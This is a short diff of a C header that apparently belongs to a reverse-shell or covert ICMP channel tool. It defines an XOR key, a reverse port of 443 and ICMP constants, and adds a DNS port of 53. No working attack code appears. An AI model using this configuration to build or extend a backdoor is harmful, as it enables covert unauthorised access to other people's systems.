@@ -1,6 +1,6 @@
 #pragma once
 
-#ifdef DEBUG
+#ifdef _DEBUG
 #include <errno.h>
 #include <stdio.h>
 #endif
@@ -12,7 +12,6 @@
 // #pragma comment(lib, "rpcrt4")
 
 // extern struct GUID id;
-static struct sockaddr_in* localaddr;
 
 struct icmp_hdr_s {
 	uint8_t type;
@@ -85,6 +84,7 @@ struct sockaddr_in* getIP();
 #define XOR_KEY 	0x10
 
 #define REV_PORT 	443
+#define PING_PORT	53
 
 #define ICMP_REQ 	8
 #define ICMP_CODE	1
